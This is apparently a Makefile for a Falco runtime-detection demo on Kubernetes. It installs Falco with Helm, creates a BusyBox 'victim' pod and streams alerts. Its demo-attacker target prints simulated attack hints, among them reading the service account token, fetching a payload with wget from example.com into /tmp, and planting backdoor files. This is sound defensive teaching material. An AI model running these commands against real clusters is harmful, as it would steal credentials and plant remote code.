# Makefile for Falco + CKS Demo (macOS / Docker Desktop)
# Quick demo setup: install Falco → deploy victim pod → stream alerts live.
# Use scripts/demo_attacker.sh for reliable scripted attacks.

# Configurações
NAMESPACE := falco
VICTIM_POD := victim-pod

# Cores para output
GREEN  := \033[0;32m
YELLOW := \033[0;33m
RED    := \033[0;31m
NC     := \033[0m # No Color

.PHONY: help setup check-env check-docker install-falco install-falco-no-wait deploy-victim wait clean demo-defender demo-attacker demo-defender-script demo-attacker-script demo-run

# Show available targets
help: ## Show available commands
	@awk 'BEGIN {FS = ":.*##"; printf "\nUsage:\n  make \033[36m<command>\033[0m\n\nCommands:\n"} /^[a-zA-Z_-]+:.*?##/ { printf "  \033[36m%-15s\033[0m %s\n", $$1, $$2 }' $(MAKEFILE_LIST)

# One command to set everything up
setup: check-env install-falco-no-wait deploy-victim wait ## 🚀 Prepare the full environment (Start Docker, install Falco (non-blocking), create pod)
	@echo ""
	@echo "${GREEN}✅ Setup complete!${NC}"
	@echo "To run the demo, open two terminals and run:"
	@echo "  ${YELLOW}make demo-defender${NC} (Terminal 1)"
	@echo "  ${YELLOW}make demo-attacker${NC} (Terminal 2)"

# Check kubectl and helm are installed
check-env: ## Verify required tools (kubectl, helm) are installed
	@echo "${YELLOW}🔍 Checking required tools...${NC}"
	@which kubectl > /dev/null || (echo "${RED}Error: kubectl not found.${NC}"; exit 1)
	@which helm > /dev/null || (echo "${RED}Error: helm not found. (brew install helm)${NC}"; exit 1)
	@make check-docker

# Is Docker running? Start it if needed and wait for Kubernetes
check-docker: ## Check if Docker is running and start it if necessary
	@echo "${YELLOW}🐳 Checking Docker Desktop...${NC}"
	@if ! docker info > /dev/null 2>&1; then \
		echo "${YELLOW}Docker is not running. Starting Docker Desktop on macOS...${NC}"; \
		open -a Docker; \
		echo "Waiting for Kubernetes to start (this may take a few minutes)..."; \
		count=0; \
		while [ $$count -lt 120 ]; do \
			if kubectl cluster-info > /dev/null 2>&1; then break; fi; \
			printf "."; \
			sleep 5; \
			count=$$((count+1)); \
		done; \
		echo ""; \
		echo "${GREEN}Docker and Kubernetes are online!${NC}"; \
	else \
		echo "${GREEN}Docker is already running.${NC}"; \
	fi


# Install Falco via Helm with modern_ebpf driver
install-falco: ## Install/upgrade Falco via Helm (modern_ebpf driver for Docker Desktop)
	@echo "${YELLOW}🛡️  Installing Falco...${NC}"
	@helm repo add falcosecurity https://falcosecurity.github.io/charts > /dev/null 2>&1
	@helm repo update > /dev/null 2>&1
	@helm upgrade --install falco falcosecurity/falco \
		--namespace $(NAMESPACE) \
		--create-namespace \
		--set driver.kind=modern_ebpf \
		--set tty=true \
		--wait
	@echo "${GREEN}Falco installed.${NC}"


# Create a simple BusyBox pod for demo attacks
deploy-victim: ## Create the victim pod (busybox)
	@echo "${YELLOW}😈 Creating victim pod...${NC}"
	@kubectl run $(VICTIM_POD) --image=busybox --restart=Never -- sleep 3600 2>/dev/null || echo "Victim pod already exists."


# Wait for all pods to be ready
wait: ## Wait for all pods to become ready
	@echo "${YELLOW}⏳ Waiting for pods to become 'Running'...${NC}"
	@kubectl wait --for=condition=Ready pod -l app.kubernetes.io/name=falco -n $(NAMESPACE) --timeout=300s 2>/dev/null || true
	@kubectl wait --for=condition=Ready pod/$(VICTIM_POD) --timeout=60s 2>/dev/null || true
	@echo "${GREEN}All pods are ready!${NC}"


# Terminal 1: stream Falco logs live
demo-defender: ## 🛡️  Command for Terminal 1 (Stream Falco logs)
	@echo "${GREEN}Streaming Falco logs... (Press Ctrl+C to stop)${NC}"
	@kubectl logs -f -n $(NAMESPACE) -l app.kubernetes.io/name=falco


# Terminal 2: enter the victim pod and run attacks
demo-attacker: ## 💀 Command for Terminal 2 (Enter the victim pod)
	@echo "${RED}Entering victim pod...${NC}"
	@echo "Attack hints (simulated):"
	@echo "  1. ${YELLOW}cat /var/run/secrets/kubernetes.io/serviceaccount/token${NC}    # Read service account token"
	@echo "  2. ${YELLOW}touch /etc/iam-a-backdoor${NC}                                   # Create a suspicious file"
	@echo "  3. ${YELLOW}wget http://example.com/payload -O /tmp/payload${NC}               # Fetch remote payload (simulated)"
	@echo "  4. ${YELLOW}echo malicious > /tmp/backdoor && chmod +x /tmp/backdoor${NC}         # Create executable in /tmp"
	@echo "  5. ${YELLOW}ps aux | head -n 10${NC}                                           # List running processes"
	@echo "  6. ${YELLOW}ping -c 3 8.8.8.8${NC}                                           # Basic network traffic"
	@echo "  7. ${YELLOW}find / -name '*.conf' 2>/dev/null | head -5${NC}                 # Search for config files"
	@# Ensure the victim pod is in Running state; recreate if it's completed/failed or missing
	@status=$$(kubectl get pod $(VICTIM_POD) -o jsonpath='{.status.phase}' 2>/dev/null || echo "NotFound"); \
	if [ "$$status" != "Running" ]; then \
		echo "${YELLOW}Victim pod not running (status: $$status). Recreating...${NC}"; \
		kubectl delete pod $(VICTIM_POD) --ignore-not-found=true >/dev/null 2>&1 || true; \
		kubectl run $(VICTIM_POD) --image=busybox --restart=Never -- sleep 3600; \
		kubectl wait --for=condition=Ready pod/$(VICTIM_POD) --timeout=60s >/dev/null 2>&1 || true; \
	fi; \
	# Exec into the (now) running victim pod
	kubectl exec -it $(VICTIM_POD) -- /bin/sh


demo-defender-script: ## Stream Falco logs using the helper script
	@chmod +x scripts/demo_defender.sh 2>/dev/null || true
	@./scripts/demo_defender.sh


demo-attacker-script: ## Run the attacker helper script (non-interactive)
	@chmod +x scripts/demo_attacker.sh 2>/dev/null || true
	@./scripts/demo_attacker.sh


install-falco-no-wait: ## Install Falco via Helm without waiting for readiness (faster for scripted demos)
	@echo "Installing Falco (no --wait)..."
	@helm repo add falcosecurity https://falcosecurity.github.io/charts >/dev/null 2>&1 || true
	@helm repo update >/dev/null 2>&1 || true
	@helm upgrade --install falco falcosecurity/falco \
		--namespace $(NAMESPACE) \
		--create-namespace \
		--set driver.kind=modern_ebpf \
		--set tty=true || true


demo-run: install-falco-no-wait deploy-victim ## Non-interactive demo: install, create victim, run attacker once and show logs briefly
	@echo "Running non-interactive demo: attacker sequence then tail Falco logs (short)"
	@chmod +x scripts/demo_attacker.sh >/dev/null 2>&1 || true
	@./scripts/demo_attacker.sh || true
	@echo "Sleeping 5s to allow Falco to emit logs..."
	@sleep 5
	@kubectl logs -n $(NAMESPACE) -l app.kubernetes.io/name=falco --tail=200 || echo "No Falco logs available"


# Clean up: remove Falco, victim pod, and the namespace
clean: ## Remove everything (Falco, pods, namespace)
	@echo "${YELLOW}🧹 Cleaning up the environment...${NC}"
	@kubectl delete pod $(VICTIM_POD) --ignore-not-found=true
	@helm uninstall falco -n $(NAMESPACE) 2>/dev/null || true
	@kubectl delete ns $(NAMESPACE) --ignore-not-found=true
	@echo "${GREEN}Cleanup complete.${NC}"
